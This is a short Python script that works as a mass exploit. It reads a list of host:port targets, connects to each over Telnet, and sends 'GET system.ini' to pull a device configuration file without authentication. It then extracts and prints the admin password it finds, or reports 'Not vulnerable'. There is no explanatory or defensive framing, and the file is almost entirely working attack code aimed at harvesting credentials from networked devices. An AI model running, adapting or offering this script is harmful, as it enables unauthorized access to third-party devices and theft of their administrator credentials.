from telnetlib import Telnet 
import socket

try:
	f = open('out.txt')
	lines = f.readlines()
except:
	print("out.txt file is missing...")

for line in lines:
	data = line.split()
	try:
		try:
			try:
				with Telnet(str(data[0]), int(data[1]), 1.5) as tn:
					print("---------------------\\http://" + data[0] + ":" + data[1] + "\\----------------------------")
					tn.write(b"GET system.ini\n\n")
					response = tn.read_all()
					idx = response.find(b'admin')
					if idx != -1:
						print("username: admin\n")
						print("password: ", end='')
						response = response[idx + 5:]
						idx = response.find(b'\x01')
						response = response[:idx]
						if response.find(b'\x01') != -1:
							idx = response.find('\x01')
						if response.find(b'\x05') != -1:
							idx = response.find('\x05')
						if response.find(b'\x03') != -1:
							idx = response.find('\x03')
						if response.find(b'\n') != -1:
							idx = response.find('\n')
						response = str(response[:idx])
						print(response.replace('b''', ''))
						print('\n')
					else:
						print("Not vulnerable")
					tn.close()
			except socket.timeout:
				print("timeout...\n")
		except EOFError:
			print("EOFError...\n")
	except:
		pass
